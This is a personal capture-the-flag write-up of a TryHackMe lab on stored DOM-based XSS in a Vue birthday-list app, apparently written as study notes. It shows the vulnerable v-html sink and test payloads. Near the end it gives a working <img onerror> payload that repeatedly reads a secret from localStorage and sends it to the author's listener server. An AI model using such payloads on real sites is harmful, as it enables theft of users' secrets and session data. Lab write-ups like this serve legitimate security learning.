# 1) Summary
- Room: Dom-Based Attacks
- URL: https://tryhackme.com/room/dombasedattacks task 7
- Skills: DOM-based XSS
- Question unsolved: why the secret couldn't be displayed in console.log() but can be exfiltrated to another server?

# 2) Writeups to get the flag.
- skipping the details here to setup /etc/hosts
- The background was, a site vulnerable to stored DOM-based XSS attack was presented. Once could add and update birthdays but unable to delete. The aim is to weaponise XSS vulnerable to recover information in oprder to delete birthdays. The flag will be received once all data is deleted. I found it was a challenging room and dcoumentation will assist me to think clear.
- It was a Vue application. One would need to go stright to the Debugger to inspect the javascript loaded.
- Vue.js runs in the client-side to build SPAs (single-page applications) by manipulating DOM dynamically on data changes.
- The goal is to delete all record. So I found out the part deleting data in the script first.
- here is the UI and the part of code to delete.
<img width="1289" height="955" alt="Screenshot from 2025-09-28 15-01-56" src="https://github.com/user-attachments/assets/2aa254be-1dfa-4787-8057-69a4da35a606" />
- here is the extracted code:
```javascript
    removeBday(bdayID) {
      var secret = localStorage.getItem('secret');
      const path = `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`;
      axios.delete(path + secret)
        .then((res) => {
          this.getBdays();
          this.message = res.data.message;
          this.showMessage = true;
        })
        .catch((error) => {
          console.error(error);
          this.getBdays();
        });
    },
```
- looking at the Storage, the Key secret is "nottherealsecret". Appearant this is the key need to be retrieved by DOM-based XSS attack. I clicked the delete button and was validated.
  <img width="1289" height="580" alt="Screenshot from 2025-09-28 15-06-08" src="https://github.com/user-attachments/assets/c2b9ffa2-043c-4d54-9c46-1440549f1f1f" />
- this is where a new birthday is added
  <img width="1283" height="777" alt="Screenshot from 2025-09-28 15-11-47" src="https://github.com/user-attachments/assets/70d12da1-916e-412b-92ad-8b9f5c0fdae6" />
- this is where birthday is updated (highlighted the typo)
  <img width="1283" height="777" alt="image" src="https://github.com/user-attachments/assets/a4ad8d22-d0c6-4638-a551-1a94cb2f60be" />
- Then i found where the field is vulnerable to XSS DOM based attack because v-html bypass Vue's default security and get executed immediately in the DOM. the source is bday.person and the sink is v-html. Here we have the answer to the first two questions.
  <img width="1283" height="777" alt="image" src="https://github.com/user-attachments/assets/920457eb-4504-4ea7-b039-629e61ad768e" />
- This was the hint from the room: Hint: You need to trick another application user into giving you sensitive information. However, if you alert this user, they will become suspicious and simply stop using the application. You can console them by either logging while you perform your tests or restarting the entire machine. Furthermore, if you are able to get an interaction from the user but it isn't exactly what you were hoping for, perhaps the answer is to monitor the user closer and for longer!. This was another hint "When you make a delete request, a specific value is attached to the request. However, this value is set by default when the page is loaded. The other user first has to load the page, then set the value manually themselves, and only then can they delete birthdays. You will have to introduce a delay in your payload of at least 6 seconds to allow for this change to be made."
- First, I used console.log to test it out. The payload was `<script> console.log(localStorage.getItem('secret'));</script>`
- It didn't work. It was mentioned in the class saying innerHTML block it not Vue.js.
- Second, I tried. <img src=x onerror="console.log(localStorage.getItem('secret'))">. It worked. But it was showing "nottherealsecret". This is the default value the hint mentioned. From the hint once I made change to the name, at least 6 seconds to allow changes be made.
- <img width="1303" height="690" alt="Screenshot from 2025-09-28 15-35-16" src="https://github.com/user-attachments/assets/1c55b305-cb2e-40f5-a1b3-09e91c49d0b6" />

# THEN IN THE NEXT TWO HOURS I WAS TRYING TO FIGURE OUT WHY I COULDN'T SEND THE SECRET TO CONSOLE.LOG(). 

- I found out others was sending the secret to own http.server. I followed the same and setup a simple server in kali: `python3 -m http.server 4444`
- Then used this payload: `<img src=x onerror="setInterval(() => {
   var secret = localStorage.getItem('secret');
   new Image().src = 'http://10.11.139.184:4444/?secret=' + encodeURIComponent(secret);
   console.log(secret);
}, 6000);">`
- the required data/secret was extracted successfully:
  <img width="1911" height="945" alt="image" src="https://github.com/user-attachments/assets/3662bd54-cca7-4859-8346-5389c1982aa3" />
- To get the flag the remaining was straight forward. Since the secret was a client-side measurement. One only need to change the secret under "Storage" and delete the data manually to get the flag.
- <img width="1129" height="461" alt="image" src="https://github.com/user-attachments/assets/0a9fc979-cfd3-4bda-9dc2-125ffe9bfe50" />

- 

  
